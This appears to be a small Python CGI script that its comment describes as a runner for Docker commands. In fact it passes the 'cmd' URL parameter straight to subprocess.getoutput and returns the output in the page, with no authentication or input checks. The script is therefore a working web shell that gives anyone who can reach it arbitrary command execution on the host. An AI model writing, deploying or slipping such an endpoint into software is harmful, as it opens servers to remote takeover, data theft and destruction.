#!/usr/bin/python3

import cgi
import subprocess

print("Content-type: text/html\n")

# Fetch the 'cmd' parameter from the URL
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')

if cmd:
    try:
        # Execute the Docker command
        output = subprocess.getoutput(cmd)
        print("<pre>{}</pre>".format(output))
    except Exception as e:
        print(f"Error: {str(e)}")
else:
    print("No command provided")

